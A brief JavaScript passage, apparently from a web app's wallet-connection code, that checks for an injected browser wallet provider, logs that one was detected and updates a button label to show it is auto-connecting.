   if (env.canUseInjectedProvider) {
     Log.info('Provider detected — auto-connecting...');
     $('wbtnLabel').textContent = 'Wallet detected — connecting...';
